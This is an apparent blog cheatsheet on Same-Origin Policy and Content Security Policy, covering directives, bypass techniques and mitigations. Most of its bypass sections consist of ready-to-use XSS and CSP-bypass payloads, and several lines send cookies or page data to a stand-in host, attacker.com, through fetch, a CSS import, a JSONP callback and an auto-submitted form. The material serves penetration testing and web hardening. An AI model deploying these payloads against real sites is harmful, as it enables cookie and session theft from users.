---
layout: post
title: CSP & Same-Origin Policy Bypass
date: 2025-04-10 16:44 +0300
category: [Web Security, Client-Side Attacks]
tags: [web security, csp, same-origin policy]
---

## Introduction

Content Security Policy (CSP) and Same-Origin Policy (SOP) are critical web security mechanisms designed to prevent various attacks including Cross-Site Scripting (XSS) and data theft. This cheatsheet covers their functionality and techniques to bypass these protections.

## Same-Origin Policy (SOP)

### Overview

Same-Origin Policy is a security mechanism that restricts how documents or scripts from one origin can interact with resources from another origin. An origin is defined by the scheme (protocol), host (domain), and port of a URL.

### Same-Origin Definition

Two URLs have the same origin if they have identical schemes, hosts, and ports:

```plaintext
https://example.com/page1.html  # Origin: https://example.com
https://example.com/page2.html  # Same origin as above
http://example.com              # Different origin (different scheme)
https://sub.example.com         # Different origin (different host)
https://example.com:8080        # Different origin (different port)
```

### SOP Restrictions

1. **JavaScript**: Cannot access DOM methods and properties across origins
2. **Cookies**: Cannot access cookies from different origins
3. **AJAX**: Cannot make cross-origin requests without CORS headers
4. **LocalStorage/IndexedDB**: Cannot access storage across origins

### SOP Exceptions

- `<script>`, `<img>`, `<link>`, `<video>`, `<audio>` tags can load cross-origin resources
- `<iframe>` can display cross-origin content (but cannot access it)
- CORS (Cross-Origin Resource Sharing) allows controlled cross-origin requests

## Content Security Policy (CSP)

### Overview

Content Security Policy is an added layer of security that helps detect and mitigate XSS and data injection attacks. It specifies which dynamic resources are allowed to load.

### Common CSP Directives

| Directive | Description | Example |
|-----------|-------------|---------|
| `default-src` | Default fallback for all resource types | `default-src 'self'` |
| `script-src` | Controls JavaScript sources | `script-src 'self' https://trusted.com` |
| `style-src` | Controls CSS sources | `style-src 'self' https://cdn.com` |
| `img-src` | Controls image sources | `img-src 'self' data:` |
| `connect-src` | Controls fetch, XHR, WebSocket | `connect-src 'self'` |
| `frame-src` | Controls sources for frames | `frame-src 'none'` |
| `font-src` | Controls font sources | `font-src 'self' https://fonts.com` |
| `object-src` | Controls Flash and other plugins | `object-src 'none'` |
| `base-uri` | Controls allowed URLs in `<base>` | `base-uri 'self'` |
| `form-action` | Controls URLs for form submissions | `form-action 'self'` |
| `frame-ancestors` | Controls who can embed the page | `frame-ancestors 'none'` |
| `report-uri` | Where to send violation reports | `report-uri /csp-report` |
| `upgrade-insecure-requests` | Upgrades HTTP to HTTPS | `upgrade-insecure-requests` |

### CSP Source Values

| Value | Description | Security Level |
|-------|-------------|---------------|
| `'none'` | Allows nothing | Highest |
| `'self'` | Allows resources from same origin | High |
| `'unsafe-inline'` | Allows inline scripts/styles | Low |
| `'unsafe-eval'` | Allows `eval()` and similar | Low |
| `'nonce-{random}'` | Allows resources with specific nonce | Medium-High |
| `'sha256-{hash}'` | Allows resources matching hash | Medium-High |
| `https://example.com` | Allows resources from specific domain | Medium |
| `*.example.com` | Allows resources from subdomains | Medium-Low |
| `data:` | Allows data: URIs | Low |
| `https:` | Allows any HTTPS URL | Very Low |
| `*` | Allows anything | None |

### CSP Implementation

```html
<!-- Via HTTP Header -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; style-src 'self';

<!-- Via Meta Tag -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted.com; style-src 'self';">
```

### Report-Only Mode

```plaintext
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-violation-report;
```

## Bypassing Same-Origin Policy

### CORS Misconfigurations

#### Permissive CORS

```plaintext
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # This is problematic with wildcard
```

#### Origin Reflection

```plaintext
# Request
Origin: https://attacker.com

# Response
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
```

#### Null Origin Bypass

```plaintext
# Request
Origin: null

# Response (vulnerable)
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### JSONP Exploitation

```javascript
// Vulnerable JSONP endpoint
<script src="https://victim.com/api/user?callback=alert"></script>

// The server returns: alert({user_data})
```

### PostMessage Vulnerabilities

#### Missing Origin Check

```javascript
// Vulnerable receiver
window.addEventListener('message', function(event) {
  // No origin check
  document.getElementById('output').innerHTML = event.data;
});

// Exploiting from attacker.com
<script>
  const victimWindow = window.open('https://victim.com');
  setTimeout(() => {
    victimWindow.postMessage('<img src=x onerror=alert(document.domain)>', '*');
  }, 2000);
</script>
```

### DNS Rebinding

1. Attacker controls `attacker.com` with short TTL
2. Victim visits `attacker.com` (resolves to attacker's server)
3. Attacker's page makes requests to `attacker.com/api`
4. DNS record changes to point to `127.0.0.1` or target IP
5. Subsequent requests go to internal target but same-origin policy allows it

## Bypassing Content Security Policy

### Misconfigured Directives

#### Missing Directives

```plaintext
# Missing object-src allows embedding Flash objects
Content-Security-Policy: default-src 'self'; script-src 'self';
```

#### Insecure Fallbacks

```plaintext
# default-src allows everything via https
Content-Security-Policy: default-src https:; script-src 'self';
```

### Unsafe Inline Bypasses

#### Exploiting 'unsafe-inline'

```html
<!-- When CSP includes: script-src 'unsafe-inline' -->
<script>alert(document.domain)</script>
<img src=x onerror="alert(document.domain)">
```

#### Exploiting 'unsafe-eval'

```javascript
// When CSP includes: script-src 'unsafe-eval'
eval("alert(document.domain)");
setTimeout("alert(document.domain)");
setInterval("alert(document.domain)");
new Function("alert(document.domain)")();
```

### Bypass via Whitelisted Domains

#### JSONP Endpoints

```html
<!-- When trusted.com is in script-src -->
<script src="https://trusted.com/jsonp?callback=alert(document.domain)//"></script>
```

#### Script Gadgets

{% raw %}
```html
<!-- When trusted.com hosts Angular -->
<script src="https://trusted.com/angular.js"></script>
<div ng-app>{{ constructor.constructor('alert(document.domain)')() }}</div>
```
{% endraw %}

#### CDN Abuse

```html
<!-- When cdnjs.cloudflare.com is in script-src -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>
{% raw %}
{{ x = $on.curry.call().eval('fetch("https://attacker.com", {credentials: "include"})') }}
{% endraw %}
</div>
```

#### Vulnerable Libraries

```html
<!-- When jQuery is allowed from a CDN -->
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
<script>
$.getScript("data:text/javascript,alert(document.domain)")
</script>
```

### DOM-Based CSP Bypasses

#### JSONP via DOM

```javascript
// When script-src includes trusted.com
var script = document.createElement('script');
script.src = "https://trusted.com/jsonp?callback=alert(document.domain)";
document.body.appendChild(script);
```

#### DOM XSS in Whitelisted Scripts

```javascript
// If the whitelisted script has a vulnerability
location.href = 'javascript:alert(document.domain)';
```

### Nonce-Based CSP Bypasses

#### Nonce Reuse

```html
<!-- When CSP includes: script-src 'nonce-r4nd0m' -->
<script nonce="r4nd0m">
  // Extract the nonce
  var nonce = document.querySelector('script').nonce;
  
  // Create a new script with the same nonce
  var script = document.createElement('script');
  script.nonce = nonce; // Reuse the nonce
  script.textContent = "alert(document.domain)";
  document.body.appendChild(script);
</script>
```

#### XSS via Script Injection with Nonce

```javascript
// If you can inject into the page's HTML generation
<script nonce="r4nd0m">alert(document.domain)</script>
```

### Hash-Based CSP Bypasses

#### Script Injection Matching Hash

```
// If CSP includes: script-src 'sha256-hash_value_here'
// You need to inject exactly the script that matches that hash
```

### Browser Bugs and Quirks

#### Safari Short Circuit

```
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-abcdef'
```
In older Safari versions, 'strict-dynamic' was ignored, allowing normal CSP bypass.

#### Edge Legacy Treatment of 'unsafe-hashes'

Edge had inconsistencies in how it implemented 'unsafe-hashes', allowing bypasses in some cases.

#### Browser Parsing Inconsistencies

```
Content-Security-Policy: script-src 'self'; object-src 'none';, script-src 'unsafe-inline'
```
Some browsers would parse the second script-src directive, allowing inline scripts.

### Special Techniques

#### Data Exfiltration via CSS

```html
<!-- When style-src includes 'unsafe-inline' -->
<style>
@import url(https://attacker.com/?data='+document.cookie);
</style>
```

#### iframes for Sandbox Escape

```html
<!-- When frame-src is not restricted -->
<iframe src="data:text/html,<script>top.postMessage(document.cookie, '*')</script>"></iframe>
```

#### Polyglot XSS

```
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

## Advanced CSP Bypass Examples

### Base-URI Bypass

```html
<!-- When base-uri is missing -->
<base href="https://attacker.com/">
<script src="/malicious.js"></script> <!-- Loads from attacker.com -->
```

### Form-Action Bypass

```html
<!-- When form-action is missing -->
<form action="https://attacker.com/log">
  <input name="stolen" value="data">
  <input type="submit" id="submit">
</form>
<script>document.getElementById("submit").click()</script>
```

### Iframe Sandboxing Escape

```html
<!-- When sandbox allows scripts and forms -->
<iframe sandbox="allow-scripts allow-forms" src="data:text/html,<script>fetch('https://attacker.com', {credentials: 'include'})</script>"></iframe>
```

### Exploiting JSONP for Data Exfiltration

```javascript
// When a trusted domain has JSONP
function steal(data) {
  fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(data)));
}

var script = document.createElement('script');
script.src = "https://trusted-site.com/api/user?callback=steal";
document.body.appendChild(script);
```

## Mitigation & Best Practices

### Strong CSP Configuration

```
Content-Security-Policy: 
  default-src 'none';
  script-src 'self' 'nonce-{random_value}';
  style-src 'self';
  img-src 'self';
  font-src 'self';
  connect-src 'self';
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri https://csp-report-collector.example.com/collector
```

### SOP Hardening

- Implement proper CORS headers
- Use SameSite cookies: `Set-Cookie: session=123; SameSite=Strict; Secure`
- Validate state in cross-origin communications
- Use anti-CSRF tokens
- Implement proper X-Frame-Options: `X-Frame-Options: DENY`

### Development Practices

1. **Avoid inline scripts/styles** - Move all code to external files
2. **Implement nonce-based CSP** - Generate random nonces for each page load
3. **Use strict CSP** - Start with 'none' and add only what's needed
4. **Monitor violations** - Use report-uri to track potential attacks
5. **Regular security audit** - Check for new vulnerabilities in allowed domains
6. **Reduce trusted domains** - Minimize your script-src whitelist
7. **Host your own scripts** - Avoid CDN risks where possible
8. **Use Subresource Integrity** - `<script src="..." integrity="sha384-..."></script>`
9. **Consider CSP Level 3 features** - Like 'strict-dynamic'

## References

1. [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
2. [Content Security Policy Reference](https://content-security-policy.com/)
3. [CSP Evaluator Tool](https://csp-evaluator.withgoogle.com/)
4. [MDN Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
5. [Google CSP Bypass Research](https://research.google/pubs/pub45542/)
6. [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
7. [CSP Is Dead, Long Live CSP! - OWASP AppSec EU 2016](https://www.youtube.com/watch?v=XLfTWiixVLE)


